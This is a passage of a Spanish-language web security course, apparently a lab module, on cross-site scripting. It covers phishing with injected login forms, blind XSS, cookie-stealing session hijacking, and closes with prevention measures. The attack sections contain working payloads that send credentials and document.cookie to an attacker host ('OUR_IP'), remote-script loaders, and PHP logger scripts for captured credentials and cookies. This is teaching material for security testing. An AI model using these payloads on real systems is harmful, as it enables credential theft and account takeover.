Esto se debe a que nuestro código JavaScript inyectado cambia el aspecto de la página cuando se ejecuta, que en este caso, está al final del código fuente. Si nuestra inyección estaba en un elemento en el medio del código fuente, entonces se pueden agregar otros scripts o elementos después de él, por lo que tendríamos que tener en cuenta para obtener el aspecto final que necesitamos.

Sin embargo, para los usuarios comunes, la página se ve desfigurada y muestra nuestro nuevo aspecto.


# Phishing

---

Otro tipo muy común de ataque XSS es un ataque de phishing. Los ataques de phishing generalmente utilizan información de aspecto legítimo para engañar a las víctimas para que envíen su información confidencial al atacante. Una forma común de ataques de phishing XSS es mediante la inyección de formularios de inicio de sesión falsos que envían los datos de inicio de sesión al servidor del atacante, que luego pueden usarse para iniciar sesión en nombre de la víctima y obtener control sobre su cuenta e información confidencial.

Además, supongamos que debíamos identificar una vulnerabilidad XSS en una aplicación web para una organización en particular. En ese caso, podemos utilizar un ataque como un ejercicio de simulación de phishing, que también nos ayudará a evaluar la conciencia de seguridad de los empleados de la organización, especialmente si confían en la aplicación web vulnerable y no esperan que les haga daño.

---

## XSS Descubrimiento

Comenzamos intentando encontrar la vulnerabilidad XSS en la aplicación web en `/phishing` desde el servidor al final de esta sección. Cuando visitamos el sitio web, vemos que es un simple visor de imágenes en línea, donde podemos ingresar una URL de una imagen, y la mostrará:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_image_viewer.jpg)

Esta forma de visores de imágenes es común en foros en línea y aplicaciones web similares. Como tenemos control sobre la URL, podemos comenzar usando la carga útil XSS básica que hemos estado usando. Pero cuando intentamos esa carga útil, vemos que nada se ejecuta, y obtenemos el `dead image url` icono:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_alert.jpg)

Por lo tanto, debemos ejecutar el proceso XSS Discovery que aprendimos anteriormente para encontrar una carga útil XSS que funcione. `Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page`.

Consejo: Para comprender qué carga útil debería funcionar, intente ver cómo se muestra su entrada en la fuente HTML después de agregarla.

---

## Iniciar sesión Formulario de inyección

Una vez que identificamos una carga útil XSS funcional, podemos proceder al ataque de phishing. Para realizar un ataque de phishing XSS, debemos inyectar un código HTML que muestre un formulario de inicio de sesión en la página de destino. Este formulario debe enviar la información de inicio de sesión a un servidor en el que estamos escuchando, de modo que una vez que un usuario intente iniciar sesión, obtengamos sus credenciales.

Podemos encontrar fácilmente un código HTML para un formulario de inicio de sesión básico, o podemos escribir nuestro propio formulario de inicio de sesión. El siguiente ejemplo debe presentar un formulario de inicio de sesión:

Código: html

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

En el código HTML anterior, `OUR_IP` es la IP de nuestra VM, que podemos encontrar con el (`ip a`) comando bajo `tun0`. Más tarde estaremos escuchando en esta IP para recuperar las credenciales enviadas desde el formulario. El formulario de inicio de sesión debe verse de la siguiente manera:

Código: html

```html
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

A continuación, debemos preparar nuestro código XSS y probarlo en el formulario vulnerable. Para escribir código HTML en la página vulnerable, podemos usar la función JavaScript `document.write()`y úselo en la carga útil XSS que encontramos anteriormente en el paso XSS Discovery. Una vez que minifiquemos nuestro código HTML en una sola línea y lo agreguemos dentro del `write` función, el código JavaScript final debe ser el siguiente:

Código: javascript

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Ahora podemos inyectar este código JavaScript usando nuestra carga útil XSS (es decir, en lugar de ejecutar el `alert(window.origin)` Código JavaScript). En este caso, estamos explotando un `Reflected XSS` vulnerabilidad, por lo que podemos copiar la URL y nuestra carga útil XSS en sus parámetros, como hemos hecho en el `Reflected XSS` sección, y la página debe verse como sigue cuando visitamos la URL maliciosa:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form.jpg)

---

## Limpieza

Podemos ver que el campo URL todavía se muestra, lo que derrota nuestra línea de "`Please login to continue`". Por lo tanto, para alentar a la víctima a usar el formulario de inicio de sesión, debemos eliminar el campo URL, de modo que puedan pensar que tienen que iniciar sesión para poder usar la página. Para hacerlo, podemos usar la función JavaScript `document.getElementById().remove()` función.

Para encontrar el `id` del elemento HTML que queremos eliminar, podemos abrir el `Page Inspector Picker` haciendo clic en [`CTRL+SHIFT+C`] y luego haciendo clic en el elemento que necesitamos: ![Inspector de Página Picker](https://academy.hackthebox.com/storage/modules/103/xss_page_inspector_picker.jpg)

Como vemos tanto en el código fuente como en el texto flotante, el `url` la forma tiene la identificación `urlform`:

Código: html

```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

Entonces, ahora podemos usar esta identificación con el `remove()` función para eliminar el formulario URL:

Código: javascript

```javascript
document.getElementById('urlform').remove();
```

Ahora, una vez que agreguemos este código a nuestro código JavaScript anterior (después del `document.write` función), podemos utilizar este nuevo código JavaScript en nuestra carga útil:

Código: javascript

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Cuando intentamos inyectar nuestro código JavaScript actualizado, vemos que el formulario URL ya no se muestra:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_2.jpg)

También vemos que todavía queda una parte del código HTML original después de nuestro formulario de inicio de sesión inyectado. Esto se puede eliminar simplemente comentando, agregando un comentario de apertura HTML después de nuestra carga útil XSS:

Código: html

```html
...PAYLOAD... <!-- 
```

Como podemos ver, esto elimina el bit restante del código HTML original, y nuestra carga útil debería estar lista. Ahora parece que la página requiere legítimamente un inicio de sesión:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_3.jpg)

Ahora podemos copiar la URL final que debería incluir toda la carga útil, y podemos enviarla a nuestras víctimas e intentar engañarlas para que usen el formulario de inicio de sesión falso. Puede intentar visitar la URL para asegurarse de que mostrará el formulario de inicio de sesión según lo previsto. También intente iniciar sesión en el formulario de inicio de sesión anterior y vea qué sucede.

---

## Robo de Credenciales

Finalmente, llegamos a la parte donde robamos las credenciales de inicio de sesión cuando la víctima intenta iniciar sesión en nuestro formulario de inicio de sesión inyectado. Si intentó iniciar sesión en el formulario de inicio de sesión inyectado, probablemente obtendría el error `This site can’t be reached`. Esto se debe a que, como se mencionó anteriormente, nuestro formulario HTML está diseñado para enviar la solicitud de inicio de sesión a nuestra IP, que debería estar escuchando una conexión. Si no estamos escuchando una conexión, obtendremos una `site can’t be reached` error.

Entonces, comencemos un simple `netcat` servidor y vea qué tipo de solicitud recibimos cuando alguien intenta iniciar sesión a través del formulario. Para hacerlo, podemos comenzar a escuchar en el puerto 80 en nuestro Pwnbox, de la siguiente manera:

  Phishing

```shell-session
vcrdcr@htb[/htb]$ sudo nc -lvnp 80
listening on [any] 80 ...
```

Ahora, intentemos iniciar sesión con las credenciales `test:test`y comprueba el `netcat` salida que obtenemos (`don't forget to replace OUR_IP in the XSS payload with your actual IP`):

  Phishing

```shell-session
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

Como podemos ver, podemos capturar las credenciales en la URL de solicitud HTTP (`/?username=test&password=test`). Si alguna víctima intenta iniciar sesión con el formulario, obtendremos sus credenciales.

Sin embargo, como solo estamos escuchando con un `netcat` oyente, no manejará la solicitud HTTP correctamente, y la víctima obtendría un `Unable to connect` error, que puede levantar algunas sospechas. Por lo tanto, podemos usar un script PHP básico que registra las credenciales de la solicitud HTTP y luego devuelve a la víctima a la página original sin ninguna inyección. En este caso, la víctima puede pensar que inició sesión con éxito y usará el Visor de imágenes según lo previsto.

El siguiente script PHP debería hacer lo que necesitamos, y lo escribiremos en un archivo en nuestra VM que llamaremos `index.php` y colócalo `/tmp/tmpserver/` (`don't forget to replace SERVER_IP with the ip from our exercise`):

Código: php

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Ahora que tenemos nuestro `index.php` archivo listo, podemos iniciar un `PHP` servidor de escucha, que podemos usar en lugar de lo básico `netcat` oyente que usamos antes:

  Phishing

```shell-session
vcrdcr@htb[/htb]$ mkdir /tmp/tmpserver
vcrdcr@htb[/htb]$ cd /tmp/tmpserver
vcrdcr@htb[/htb]$ vi index.php #at this step we wrote our index.php file
vcrdcr@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Intentemos iniciar sesión en el formulario de inicio de sesión inyectado y veamos qué obtenemos. Vemos que nos redirigen a la página original de Image Viewer:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_image_viewer.jpg)

Si comprobamos el `creds.txt` archivo en nuestro Pwnbox, vemos que obtuvimos las credenciales de inicio de sesión:

  Phishing

```shell-session
vcrdcr@htb[/htb]$ cat creds.txt
Username: test | Password: test
```

Con todo listo, podemos iniciar nuestro servidor PHP y enviar la URL que incluye nuestra carga útil XSS a nuestra víctima, y una vez que inicien sesión en el formulario, obtendremos sus credenciales y las usaremos para acceder a sus cuentas.


# Session Hijacking

Las aplicaciones web modernas utilizan cookies para mantener la sesión de un usuario en diferentes sesiones de navegación. Esto permite al usuario iniciar sesión solo una vez y mantener viva su sesión de inicio de sesión, incluso si visita el mismo sitio web en otro momento o fecha. Sin embargo, si un usuario malicioso obtiene los datos de las cookies del navegador de la víctima, es posible que pueda obtener acceso conectado con el usuario de la víctima sin conocer sus credenciales.

Con la capacidad de ejecutar código JavaScript en el navegador de la víctima, es posible que podamos recopilar sus cookies y enviarlas a nuestro servidor para secuestrar su sesión de inicio de sesión realizando un `Session Hijacking` (aka `Cookie Stealing`) ataque.

---

## Detección de XSS Ciego

Por lo general, iniciamos ataques XSS tratando de descubrir si existe una vulnerabilidad XSS y dónde. Sin embargo, en este ejercicio, vamos a tratar con un `Blind XSS` vulnerabilidad. Una vulnerabilidad de Blind XSS ocurre cuando la vulnerabilidad se activa en una página a la que no tenemos acceso.

Las vulnerabilidades XSS ciegas generalmente ocurren con formularios solo accesibles por ciertos usuarios (por ejemplo, administradores). Algunos ejemplos potenciales incluyen:

- Formularios de Contacto
- Reseñas
- Detalles del Usuario
- Entradas de Soporte
- encabezado HTTP User-Agent

Ejecutemos la prueba en la aplicación web en (`/hijacking`) en el servidor al final de esta sección. Vemos una página de Registro de Usuario con múltiples campos, así que intentemos enviar un `test` usuario para ver cómo maneja el formulario los datos:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form.jpg)

Como podemos ver, una vez que enviamos el formulario recibimos el siguiente mensaje:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form_output.jpg)

Esto indica que no veremos cómo se manejará nuestra entrada o cómo se verá en el navegador, ya que aparecerá para el Administrador solo en un Panel de administración determinado al que no tenemos acceso. En casos normales (es decir, no ciegos), podemos probar cada campo hasta que obtengamos un `alert` box, como lo que hemos estado haciendo en todo el módulo. Sin embargo, como no tenemos acceso a través del panel de administración en este caso, `how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?`

Para hacerlo, podemos usar el mismo truco que usamos en la sección anterior, que es usar una carga útil de JavaScript que envía una solicitud HTTP a nuestro servidor. Si se ejecuta el código JavaScript, obtendremos una respuesta en nuestra máquina y sabremos que la página es realmente vulnerable.

Sin embargo, esto introduce dos cuestiones:

1. `How can we know which specific field is vulnerable?`Dado que cualquiera de los campos puede ejecutar nuestro código, no podemos saber cuál de ellos lo hizo.
2. `How can we know what XSS payload to use?`¿Dado que la página puede ser vulnerable, pero la carga útil puede no funcionar?

---

## Cargando un Script Remoto

En HTML, podemos escribir código JavaScript dentro del `<script>` etiquetas, pero también podemos incluir un script remoto proporcionando su URL, de la siguiente manera:

Código: html

```html
<script src="http://OUR_IP/script.js"></script>
```

Por lo tanto, podemos usar esto para ejecutar un archivo JavaScript remoto que se sirve en nuestra VM. Podemos cambiar el nombre del script solicitado desde `script.js` al nombre del campo en el que estamos inyectando, de modo que cuando recibimos la solicitud en nuestra VM, podemos identificar el campo de entrada vulnerable que ejecutó el script, de la siguiente manera:

Código: html

```html
<script src="http://OUR_IP/username"></script>
```

Si recibimos una solicitud de `/username`, entonces sabemos que el `username` el campo es vulnerable a XSS, y así sucesivamente. Con eso, podemos comenzar a probar varias cargas útiles XSS que cargan un script remoto y ver cuál de ellas nos envía una solicitud. Los siguientes son algunos ejemplos que podemos utilizar de [Cargas útilesAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):

Código: html

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Como podemos ver, varias cargas útiles comienzan con una inyección como `'>`, que puede o no funcionar dependiendo de cómo se maneje nuestra entrada en el backend. Como se mencionó anteriormente en el `XSS Discovery` sección, si tuviéramos acceso al código fuente (es decir, en un DOM XSS), sería posible escribir con precisión la carga útil requerida para una inyección exitosa. Esta es la razón por la cual Blind XSS tiene una mayor tasa de éxito con el tipo de vulnerabilidades DOM XSS.

Antes de comenzar a enviar cargas útiles, debemos iniciar un oyente en nuestra VM, utilizando `netcat` o `php` como se muestra en una sección anterior:

  Sesión de Secuestro

```shell-session
vcrdcr@htb[/htb]$ mkdir /tmp/tmpserver
vcrdcr@htb[/htb]$ cd /tmp/tmpserver
vcrdcr@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Ahora podemos comenzar a probar estas cargas útiles una por una usando una de ellas para todos los campos de entrada y añadiendo el nombre del campo después de nuestra IP, como se mencionó anteriormente, como:

Código: html

```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```

Consejo: Notaremos que el correo electrónico debe coincidir con un formato de correo electrónico, incluso si intentamos manipular los parámetros de solicitud HTTP, ya que parece estar validado tanto en el front-end como en el back-end. Por lo tanto, el campo de correo electrónico no es vulnerable, y podemos omitir probarlo. Del mismo modo, podemos omitir el campo de contraseña, ya que las contraseñas generalmente se hash y no se muestran en texto claro. Esto nos ayuda a reducir el número de campos de entrada potencialmente vulnerables que necesitamos probar.

Una vez que enviamos el formulario, esperamos unos segundos y revisamos nuestro terminal para ver si algo se llama nuestro servidor. Si nada llama a nuestro servidor, entonces podemos pasar a la siguiente carga útil, y así sucesivamente. Una vez que recibimos una llamada a nuestro servidor, debemos tener en cuenta la última carga útil XSS que utilizamos como carga útil de trabajo y anotar el nombre del campo de entrada que llamó a nuestro servidor como el campo de entrada vulnerable.

`Try testing various remote script XSS payloads with the remaining input fields, and see which of them sends an HTTP request to find a working payload`.

---

## Sesión de Secuestro

Una vez que encontremos una carga útil XSS que funcione y hayamos identificado el campo de entrada vulnerable, podemos proceder a la explotación de XSS y realizar un ataque de Secuestro de Sesión.

Un ataque de secuestro de sesión es muy similar al ataque de phishing que realizamos en la sección anterior. Requiere una carga útil de JavaScript para enviarnos los datos requeridos y un script PHP alojado en nuestro servidor para capturar y analizar los datos transmitidos.

Hay múltiples cargas útiles de JavaScript que podemos usar para tomar la cookie de sesión y enviárnosla, como se muestra en [Cargas útilesAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc):

Código: javascript

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Usar cualquiera de las dos cargas útiles debería funcionar al enviarnos una cookie, pero usaremos la segunda, ya que simplemente agrega una imagen a la página, que puede no ser muy maliciosa, mientras que la primera navega a nuestra página PHP de captura de cookies, que puede parecer sospechosa.

Podemos escribir cualquiera de estas cargas útiles de JavaScript para `script.js`, que también estará alojado en nuestra VM:

Código: javascript

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Ahora, podemos cambiar la URL en la carga útil XSS que encontramos anteriormente para usar `script.js` (`don't forget to replace OUR_IP with your VM IP in the JS script and the XSS payload`):

Código: html

```html
<script src=http://OUR_IP/script.js></script>
```

Con nuestro servidor PHP en ejecución, ahora podemos usar el código como parte de nuestra carga útil XSS, enviarlo en el campo de entrada vulnerable y deberíamos recibir una llamada a nuestro servidor con el valor de la cookie. Sin embargo, si hubiera muchas cookies, es posible que no sepamos qué valor de cookie pertenece a qué encabezado de cookie. Por lo tanto, podemos escribir un script PHP para dividirlos con una nueva línea y escribirlos en un archivo. En este caso, incluso si varias víctimas activan el exploit XSS, obtendremos todas sus cookies ordenadas en un archivo.

Podemos guardar el siguiente script PHP como `index.php`, y volver a ejecutar el servidor PHP de nuevo:

Código: php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Ahora, esperamos a que la víctima visite la página vulnerable y vea nuestra carga útil XSS. Una vez que lo hagan, obtendremos dos solicitudes en nuestro servidor, una para `script.js`, que a su vez hará otra solicitud con el valor de la cookie:

  Sesión de Secuestro

```shell-session
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

Como se mencionó anteriormente, obtenemos el valor de la cookie directamente en el terminal, como podemos ver. Sin embargo, ya que preparamos un script PHP, también obtenemos el `cookies.txt` archivo con un registro limpio de cookies:

  Sesión de Secuestro

```shell-session
vcrdcr@htb[/htb]$ cat cookies.txt 
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

Finalmente, podemos usar esta cookie en el `login.php` página para acceder a la cuenta de la víctima. Para hacerlo, una vez que navegamos a `/hijacking/login.php`, podemos hacer clic `Shift+F9` en Firefox para revelar el `Storage` bar en las Herramientas para desarrolladores. Entonces, podemos hacer clic en el `+` botón en la esquina superior derecha y añadir nuestra cookie, donde el `Name` es la parte antes `=` y el `Value` es la parte siguiente `=` de nuestra cookie robada:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_set_cookie_2.jpg)

Una vez que configuramos nuestra cookie, podemos actualizar la página y obtendremos acceso como víctima:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_hijacked_session.jpg)


# XSS Prevención

---

Por ahora, deberíamos tener una buena comprensión de lo que es una vulnerabilidad XSS y sus diferentes tipos, cómo detectar una vulnerabilidad XSS y cómo explotar las vulnerabilidades XSS. Concluiremos el módulo aprendiendo cómo defenderse contra las vulnerabilidades XSS.

Como se discutió anteriormente, las vulnerabilidades XSS están vinculadas principalmente a dos partes de la aplicación web: A `Source` como un campo de entrada de usuario y un `Sink` eso muestra los datos de entrada. Estos son los dos puntos principales que debemos centrarnos en asegurar, tanto en el front-end como en el back-end.

El aspecto más importante de la prevención de vulnerabilidades XSS es la desinfección y validación de entrada adecuada tanto en el front como en el back-end. Además de eso, se pueden tomar otras medidas de seguridad para ayudar a prevenir ataques XSS.

---

## Frontal

Como el front-end de la aplicación web es donde se toma la mayor parte (pero no toda) de la entrada del usuario, es esencial desinfectar y validar la entrada del usuario en el front-end usando JavaScript.

#### Validación de Entrada

Por ejemplo, en el ejercicio de la `XSS Discovery` sección, vimos que la aplicación web no nos permitirá enviar el formulario si el formato de correo electrónico no es válido. Esto se hizo con el siguiente código JavaScript:

Código: javascript

```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

Como podemos ver, este código está probando el `email` campo de entrada y devolución `true` o `false` si coincide con la validación Regex de un formato de correo electrónico.

#### Desinfección de Entrada

Además de la validación de entrada, siempre debemos asegurarnos de no permitir ninguna entrada con código JavaScript, escapando de caracteres especiales. Para esto, podemos utilizar el [DOMPurificar](https://github.com/cure53/DOMPurify) Biblioteca JavaScript, de la siguiente manera:

Código: javascript

```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

Esto escapará a cualquier personaje especial con una reacción inversa `\`, lo que debería ayudar a garantizar que un usuario no envíe ninguna entrada con caracteres especiales (como el código JavaScript), lo que debería evitar vulnerabilidades como DOM XSS.

#### Entrada Directa

Finalmente, siempre debemos asegurarnos de que nunca usamos la entrada del usuario directamente dentro de ciertas etiquetas HTML, como:

1. Código JavaScript `<script></script>`
2. Código de Estilo CSS `<style></style>`
3. Campos de Etiqueta/Atributo `<div name='INPUT'></div>`
4. Comentarios HTML `<!-- -->`

Si la entrada del usuario entra en cualquiera de los ejemplos anteriores, puede inyectar código JavaScript malicioso, lo que puede conducir a una vulnerabilidad XSS. Además de esto, debemos evitar el uso de funciones JavaScript que permitan cambiar el texto sin procesar de los campos HTML, como:

- `DOM.innerHTML`
- `DOM.outerHTML`
- `document.write()`
- `document.writeln()`
- `document.domain`

Y las siguientes funciones de jQuery:

- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

A medida que estas funciones escriben texto sin procesar en el código HTML, si alguna entrada del usuario entra en ellas, puede incluir código JavaScript malicioso, lo que conduce a una vulnerabilidad XSS.

---

## Back-end

Por otro lado, también debemos asegurarnos de evitar vulnerabilidades XSS con medidas en el back-end para evitar vulnerabilidades XSS Almacenadas y Reflejadas. Como vimos en el `XSS Discovery` ejercicio de sección, a pesar de que tenía validación de entrada de front-end, esto no fue suficiente para evitar que inyectáramos una carga útil maliciosa en el formulario. Por lo tanto, también deberíamos tener medidas de prevención de XSS en el back-end. Esto se puede lograr con Input and Output Sanitization and Validation, Server Configuration y Back-end Tools que ayudan a prevenir vulnerabilidades XSS.

#### Validación de Entrada

La validación de entrada en el back-end es bastante similar al front-end, y utiliza las funciones Regex o biblioteca para garantizar que el campo de entrada sea lo que se espera. Si no coincide, el servidor de back-end lo rechazará y no lo mostrará.

Un ejemplo de validación de E-Mail en un back-end de PHP es el siguiente:

Código: php

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```

Para un back-end de NodeJS, podemos usar el mismo código JavaScript mencionado anteriormente para el front-end.

#### Desinfección de Entrada

Cuando se trata de desinfección de entrada, entonces el back-end juega un papel vital, ya que la desinfección de entrada de front-end se puede evitar fácilmente enviando personalizado `GET` o `POST` solicitudes. Afortunadamente, hay bibliotecas muy sólidas para varios lenguajes de back-end que pueden desinfectar adecuadamente cualquier entrada del usuario, de modo que nos aseguramos de que no se produzca ninguna inyección.

Por ejemplo, para un back-end de PHP, podemos usar el `addslashes` función para desinfectar la entrada del usuario escapando de caracteres especiales con una barra invertida:

Código: php

```php
addslashes($_GET['email'])
```

En cualquier caso, la entrada directa del usuario (p. ej. `$_GET['email']`) nunca debe mostrarse directamente en la página, ya que esto puede conducir a vulnerabilidades XSS.

Para un back-end NodeJS, también podemos usar el [DOMPurificar](https://github.com/cure53/DOMPurify) biblioteca como hicimos con el front-end, de la siguiente manera:

Código: javascript

```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

#### Codificación HTML de salida

Otro aspecto importante a prestar atención en el back-end es `Output Encoding`. Esto significa que tenemos que codificar cualquier carácter especial en sus códigos HTML, lo cual es útil si necesitamos mostrar toda la entrada del usuario sin introducir una vulnerabilidad XSS. Para un back-end de PHP, podemos usar el `htmlspecialchars` o el `htmlentities` funciones, que codificarían ciertos caracteres especiales en sus códigos HTML (por ejemplo. `<` en `&lt;`), por lo que el navegador los mostrará correctamente, pero no causarán ninguna inyección de ningún tipo:

Código: php

```php
htmlentities($_GET['email']);
```

Para un back-end de NodeJS, podemos usar cualquier biblioteca que haga codificación HTML, como `html-entities`, como sigue:

Código: javascript

```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```

Una vez que nos aseguramos de que toda la entrada del usuario esté validada, desinfectada y codificada en la salida, debemos reducir significativamente el riesgo de tener vulnerabilidades XSS.

#### Configuración del Servidor

Además de lo anterior, hay ciertas configuraciones de servidor web de back-end que pueden ayudar a prevenir ataques XSS, tales como:

- Uso de HTTPS en todo el dominio.
- Uso de encabezados de prevención XSS.
- Usar el Tipo de contenido apropiado para la página, como `X-Content-Type-Options=nosniff`.
- Usando `Content-Security-Policy` opciones, como `script-src 'self'`, que solo permite scripts alojados localmente.
- Usando el `HttpOnly` y `Secure` banderas de cookies para evitar que JavaScript lea cookies y solo las transporte a través de HTTPS.

Además de lo anterior, tener un buen `Web Application Firewall (WAF)` puede reducir significativamente las posibilidades de explotación de XSS, ya que detectará automáticamente cualquier tipo de inyección que pase por solicitudes HTTP y rechazará automáticamente dichas solicitudes. Además, algunos marcos proporcionan protección XSS incorporada, como [ASP.EN](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0).

Al final, debemos hacer todo lo posible para proteger nuestras aplicaciones web contra vulnerabilidades XSS utilizando tales técnicas de prevención XSS. Incluso después de todo esto, debemos practicar todas las habilidades que aprendimos en este módulo e intentar identificar y explotar las vulnerabilidades XSS en cualquier campo de entrada potencial, ya que la codificación segura y las configuraciones seguras aún pueden dejar vacíos y vulnerabilidades que pueden explotarse. Si practicamos defender el sitio web utilizando ambos `offensive` y `defensive` técnicas, debemos alcanzar un nivel confiable de seguridad contra vulnerabilidades XSS.


